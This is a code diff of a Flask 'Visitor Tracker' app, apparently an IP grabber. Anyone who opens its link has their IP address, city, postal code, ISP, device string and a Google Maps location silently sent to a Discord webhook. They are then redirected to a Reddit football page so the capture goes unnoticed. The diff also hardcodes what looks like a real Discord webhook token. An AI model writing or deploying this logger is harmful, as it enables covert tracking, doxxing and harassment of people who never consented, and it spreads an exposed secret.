@@ -1,94 +1,82 @@
-import redis
 import requests
 from flask import Flask, request, redirect
 from datetime import datetime
-import os
 
 app = Flask(__name__)
 
-# Webhook URL for Discord
-DISCORD_WEBHOOK_URL = "https://canary.discord.com/api/webhooks/YOUR_WEBHOOK_URL"
-
-# Connect to Redis (ensure Redis is running locally)
-redis_url = os.getenv("REDIS_URL", "redis://localhost:6379")  # Default to localhost if not set
-r = redis.from_url(redis_url)
+# ✅ Your actual Discord webhook
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1427010775163080868/6Uaf91MUBd4GO3eYSf4y3i0VZkKQh0_pFQFO7H8M42IKWwYQmEkNcisypFHTmvTClpoS"
 
 def get_real_ip():
-    """Extract the real IP address from the request"""
-    xff = request.headers.get("X-Forwarded-For", "").split(",")
-    return xff[0].strip() if xff else request.remote_addr
+    """Extract real client IP, supports proxies and hosting services."""
+    headers_to_check = [
+        "CF-Connecting-IP",    # Cloudflare
+        "X-Forwarded-For",     # Proxies
+        "X-Real-IP"            # Nginx / Load balancers
+    ]
+    for header in headers_to_check:
+        ip = request.headers.get(header)
+        if ip:
+            # If multiple IPs in header, take the first one
+            return ip.split(",")[0].strip()
+    return request.remote_addr
 
 def get_visitor_info(ip, user_agent):
-    """Get geolocation info from ipapi based on IP address"""
+    """Get detailed geolocation info using ipinfo.io."""
     try:
-        r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
-        
-        if r.status_code == 200:
-            details = r.json()
-        else:
-            details = {}
-            print(f"API Error: Status Code {r.status_code}")
-    except Exception as e:
-        details = {}
-        print(f"API Error: {e}")
+        r = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
+        data = r.json() if r.status_code == 200 else {}
+    except Exception:
+        data = {}
 
-    lat = details.get("latitude", 0)
-    lon = details.get("longitude", 0)
+    loc = data.get("loc", "0,0").split(",")
+    lat = loc[0] if len(loc) > 1 else 0
+    lon = loc[1] if len(loc) > 1 else 0
 
     return {
         "ip": ip,
         "user_agent": user_agent,
-        "country": details.get("country_name", "Unknown"),
-        "countryCode": details.get("country_code", "XX").lower(),
-        "region": details.get("region", "Unknown"),
-        "city": details.get("city", "Unknown"),
-        "zip": details.get("postal", "Unknown"),
+        "country": data.get("country", "Unknown"),
+        "region": data.get("region", "Unknown"),
+        "city": data.get("city", "Unknown"),
+        "zip": data.get("postal", "Unknown"),
         "lat": lat,
         "lon": lon,
+        "org": data.get("org", "Unknown ISP"),
         "date": datetime.utcnow().strftime("%d/%m/%Y"),
         "time": datetime.utcnow().strftime("%H:%M:%S"),
     }
 
 def send_to_discord(info):
-    """Send the visitor info to the Discord webhook"""
+    """Send visitor info to Discord in a clean embed."""
     embed = {
-        "username": "🌍 Visitor Bot",
+        "username": "🌍 Visitor Tracker",
         "embeds": [{
-            "title": f"🚶‍♂️ New Visitor from {info['country']}",
-            "description": "Here’s a breakdown of the visitor's details:",
-            "color": 7506394,  # Light teal color
+            "title": f"🚶 New Visitor from {info['country']}",
+            "color": 7506394,
             "fields": [
-                {"name": "🖥️ IP & Location", "value": f"**IP:** `{info['ip']}`\n**City:** {info['city']} ({info['region']}, {info['country']})\n**Postal Code:** {info['zip']}", "inline": False},
-                {"name": "📱 User Agent", "value": f"**Browser/Device:** `{info['user_agent']}`", "inline": False},
-                {"name": "🌍 Google Maps Location", "value": f"[Click to view on Google Maps](https://www.google.com/maps?q={info['lat']},{info['lon']})", "inline": False}
+                {"name": "🖥️ IP Address", "value": f"`{info['ip']}`", "inline": False},
+                {"name": "📍 Location", "value": f"{info['city']}, {info['region']} ({info['country']})\nPostal: {info['zip']}", "inline": False},
+                {"name": "🏢 ISP / Organization", "value": info['org'], "inline": False},
+                {"name": "📱 Device Info", "value": f"`{info['user_agent']}`", "inline": False},
+                {"name": "🌍 Google Maps", "value": f"[Open Map](https://www.google.com/maps?q={info['lat']},{info['lon']})", "inline": False},
             ],
-            "footer": {
-                "text": f"🔗 Visit logged at: {info['date']} {info['time']} (GMT)",
-                "icon_url": "https://example.com/alarm-clock-icon.png"
-            },
-            "thumbnail": {
-                "url": "https://example.com/thumbnail-image.png"  # Optional: Custom thumbnail
-            }
+            "footer": {"text": f"Logged at {info['date']} {info['time']} GMT"}
         }]
     }
 
-    response = requests.post(DISCORD_WEBHOOK_URL, json=embed)
-    print(f"Sent to Discord: {response.status_code}")
+    try:
+        requests.post(DISCORD_WEBHOOK_URL, json=embed, timeout=5)
+    except Exception as e:
+        print(f"Error sending to Discord: {e}")
 
 @app.route('/')
 def index():
-    """Main route that handles requests"""
     ip = get_real_ip()
     user_agent = request.headers.get("User-Agent", "Unknown")
-
-    if not r.sismember("logged_ips", ip):  # Check if the IP has already been logged
-        r.sadd("logged_ips", ip)  # Log the IP in Redis
-        info = get_visitor_info(ip, user_agent)
-        send_to_discord(info)
-    else:
-        print(f"IP {ip} already logged.")
-
-    return redirect("https://www.reddit.com/r/football/")  # Redirect to a random page
+    info = get_visitor_info(ip, user_agent)
+    send_to_discord(info)
+    return redirect("https://www.reddit.com/r/football/")
 
 if __name__ == "__main__":
-    app.run(debug=True)
+    app.run(host="0.0.0.0", port=10000, debug=False)
